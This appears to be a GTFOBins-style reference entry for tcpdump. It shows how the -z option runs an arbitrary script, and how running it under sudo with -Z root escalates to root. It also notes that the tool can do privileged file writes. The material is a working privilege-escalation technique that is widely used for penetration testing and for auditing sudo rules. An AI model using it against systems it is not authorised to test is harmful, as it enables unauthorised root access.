file-write.description: It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

command.code:
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF

sudo.code:
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
